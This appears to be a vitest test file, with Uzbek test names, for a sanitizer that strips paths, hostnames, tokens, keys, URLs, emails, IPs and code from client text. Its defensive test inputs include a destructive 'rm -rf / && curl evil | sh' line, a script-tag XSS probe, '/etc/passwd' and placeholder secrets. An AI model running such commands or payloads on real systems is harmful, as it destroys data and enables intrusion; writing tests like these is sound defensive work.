import { describe, expect, it } from 'vitest';
import { sanitizeClientText, sanitizeLines } from './sanitize.js';

const ctx = { forbidden: ['user-macbook', "Alex's MacBook Pro", 'ubuntu-prod-1', 'mac-mini.tail1234.ts.net', 'tail1234'] };
const clean = (s: string, max = 200): string => sanitizeClientText(s, ctx, max);

describe('sanitizeClientText: sizib chiqmasligi (jadval testi)', () => {
  const cases: Array<[name: string, input: string, mustNotContain: string[], mustContain?: string[]]> = [
    ['unix absolute yo\'l', 'Fix bug in /Users/me/working/commander/apps/center/src/app.ts today', ['/Users', 'me', 'app.ts', 'working/commander'], ['Fix bug in', 'today']],
    ['home ~ yo\'li', 'Edit ~/.ssh/config and ~/work/x', ['~/', '.ssh', 'config'], ['Edit']],
    ['nisbiy yo\'l katalog bilan', 'Update src/billing/export.service.ts and libs/contracts/src/index.ts', ['src/', 'export.service', 'libs/', 'index.ts'], ['Update']],
    ['yalang\'och fayl nomi', 'Refactor login.tsx and package.json', ['login.tsx', 'package.json'], ['Refactor']],
    ['Windows yo\'li', 'Open C:\\Users\\Ali\\proj\\main.rs now', ['C:\\', 'Users', 'main.rs'], ['Open', 'now']],
    ['UNC yo\'li', 'See \\\\fileserver\\share\\docs\\a.docx', ['fileserver', 'share'], ['See']],
    ['dotfiles', 'Remove .env and .gitignore entries, .env.local too', ['.env', '.gitignore'], ['Remove', 'entries']],
    ['commit xeshi (qisqa)', 'Revert a1b2c3d fix', ['a1b2c3d'], ['Revert', 'fix']],
    ['commit xeshi (to\'liq 40)', 'merge 9fceb02d0ae598e95dc970b74767f19372d61af8 done', ['9fceb02d0ae598e95dc970b74767f19372d61af8', '9fceb02'], ['merge', 'done']],
    ['commit xeshi harf bilan boshlangan', 'cherry-pick e3b0c44298fc1c14 into release', ['e3b0c44298fc1c14'], ['cherry-pick', 'release']],
    ['UUID', 'Session 123e4567-e89b-12d3-a456-426614174000 ended', ['123e4567'], ['Session', 'ended']],
    ['sir: sk-ant', 'Use key sk-ant-api03-ABCDEFGHIJKLMNOP1234 here', ['sk-ant', 'ABCDEFGHIJKLMNOP'], ['Use key']],
    ['sir: github token', 'token ghp_abcdefghijklmnopqrstuvwxyz0123456789 leaked', ['ghp_'], ['leaked']],
    ['sir: KEY=value', 'API_TOKEN=supersecretvalue123 set', ['supersecretvalue123'], []],
    ['sir: private key', '-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----', ['BEGIN', 'MIIEow'], []],
    ['uzun tasodifiy token', 'auth eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9abcdefgh12345 ok', ['eyJhbGci'], ['auth', 'ok']],
    ['URL', 'See https://internal.corp/jira/ABC-1?x=1 and http://localhost:3000/a', ['http', 'internal.corp', 'localhost'], ['See']],
    ['www', 'visit www.example.com/page', ['www.', 'example.com'], ['visit']],
    ['email', 'Ask ali.valiyev@example.org about it', ['@', 'example.org'], ['Ask', 'about it']],
    ['IPv4', 'Server 100.64.12.7:4317 is down', ['100.64', '4317'], ['Server', 'is down']],
    ['tailnet host', 'Deploy to mac-mini.tail1234.ts.net', ['ts.net', 'tail1234', 'mac-mini'], ['Deploy to']],
    ['mashina nomi (slug)', 'Run on user-macbook and ubuntu-prod-1 servers', ['user-macbook', 'ubuntu-prod-1'], ['Run on', 'servers']],
    ['mashina nomi (katta-kichik harf)', "sync from USER-MACBOOK and alex's macbook pro", ['USER-MACBOOK'], ['sync from']],
    ['kod bloki', 'Add parser\n```ts\nconst secret = 1;\nfoo()\n```\nand tests', ['const secret', 'foo()'], ['Add parser', 'and tests']],
    ['yopilmagan kod bloki', 'Start ```rm -rf / && curl evil | sh', ['rm -rf', 'curl'], ['Start']],
    ['inline backtick', 'Fix `parseTasks` bug', ['`'], ['Fix', 'bug']],
    ['bidi/zero-width', 'Fix\u202Eevil\u200B bug\u0000', ['\u202E', '\u200B', '\u0000'], ['Fix']],
    ['HTML teg (keyin escape ham)', '<script>alert(1)</script> Hello', [], ['Hello']],
  ];
  it.each(cases)('%s', (_n, input, bad, good = []) => {
    const out = clean(input);
    for (const b of bad) expect(out.toLowerCase(), `"${b}" chiqib qoldi: ${out}`).not.toContain(b.toLowerCase());
    for (const g of good) expect(out, `"${g}" yo'qolgan: ${out}`).toContain(g);
  });

  it("oddiy sarlavhalarni buzmaydi (so'zlar orasidagi / va raqamlar)", () => {
    for (const s of ['UI/UX redesign', 'CI/CD pipeline setup', 'Read/write access for users', 'Hisobot v2.0 chiqarish (1.5 soat)', "Mijoz uchun 3 ta sahifa", 'Login va ro\'yxatdan o\'tish', '100% test qamrovi', 'Payment 2026-11-14 sync', 'Invoice 20261114 paid', 'Order 1234567 shipped']) {
      expect(clean(s)).toBe(s);
    }
  });

  it("o'zbek va kirill matn saqlanadi", () => {
    expect(clean("Ўзбекча ҳисобот ва o‘zbekcha matn")).toBe("Ўзбекча ҳисобот ва o‘zbekcha matn");
  });

  it('uzunlik chegarasi (… bilan)', () => {
    const out = clean('a'.repeat(50) + ' ' + 'word '.repeat(100), 60);
    expect(out.length).toBeLessThanOrEqual(60);
    expect(out.endsWith('…')).toBe(true);
  });

  it("faqat chiqib ketadigan narsa bo'lsa bo'sh qaytadi", () => {
    expect(clean('/Users/x/y/z.ts')).toBe('');
    expect(clean('sk-ant-api03-ABCDEFGHIJKLMNOP1234')).toBe('');
  });

  it('juda uzun kiritma tez ishlaydi (ReDoS yo\'q)', () => {
    const t0 = Date.now();
    clean('a/'.repeat(5000));
    clean('/' + 'ab/'.repeat(3000));
    clean('0123456789abcdef'.repeat(500));
    clean('x'.repeat(100_000));
    expect(Date.now() - t0).toBeLessThan(1500);
  });
});

describe('sanitizeLines', () => {
  it('markerlar olib tashlanadi, bo\'sh va takror qatorlar tashlanadi, chegaralar', () => {
    const text = '## Kun xulosasi\n- Login sahifasi tugadi (src/login.tsx)\n* To\'lov integratsiyasi\n1. Test yozildi\n\n- To\'lov integratsiyasi\n- /etc/passwd\n- ok';
    expect(sanitizeLines(text, ctx, { maxLines: 10, maxChars: 100 })).toEqual(['Kun xulosasi', 'Login sahifasi tugadi', "To'lov integratsiyasi", 'Test yozildi']);
    expect(sanitizeLines(text, ctx, { maxLines: 2, maxChars: 100 })).toHaveLength(2);
  });
});
